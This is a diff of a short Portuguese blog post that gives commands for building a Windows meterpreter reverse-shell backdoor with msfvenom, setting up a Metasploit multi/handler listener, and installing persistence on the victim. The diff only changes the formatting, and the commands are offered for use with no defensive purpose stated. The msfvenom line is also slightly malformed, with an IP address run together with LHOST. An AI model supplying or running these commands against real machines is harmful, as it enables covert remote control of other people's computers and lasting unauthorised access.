@@ -7,25 +7,25 @@ date: 2016-07-12T14:54:44.000Z
 
 -Comandos para criar a backdoor:
 
-#msfvenom -p windows/meterpreter/reverse_tcp 192.168.0.104LHOST=(SeuIP) LPORT=443 -f exe > /root/Desktop/shell.exe 
+```msfvenom -p windows/meterpreter/reverse_tcp 192.168.0.104LHOST=(SeuIP) LPORT=443 -f exe > /root/Desktop/shell.exe```
 
 -Comandos para configurar o modo Listening:
 
-#msfconsole
+```msfconsole```
 
-#use exploit/multi/handler
+```use exploit/multi/handler```
 
-#set payload windows/meterpreter/reverse_tcp
+```set payload windows/meterpreter/reverse_tcp```
 
-#set lhost (Seu IP)
+```set lhost (Seu IP)```
 
-#set lport 443
+```set lport 443```
 
 exploit
 
 -Comando manutenção de acesso:
 
-#run persistence -A -X -i 60 -p 443 -f (Seu IP)
+```run persistence -A -X -i 60 -p 443 -f (Seu IP)```
 
 Comandos do  meterpreter pra brinca 
 
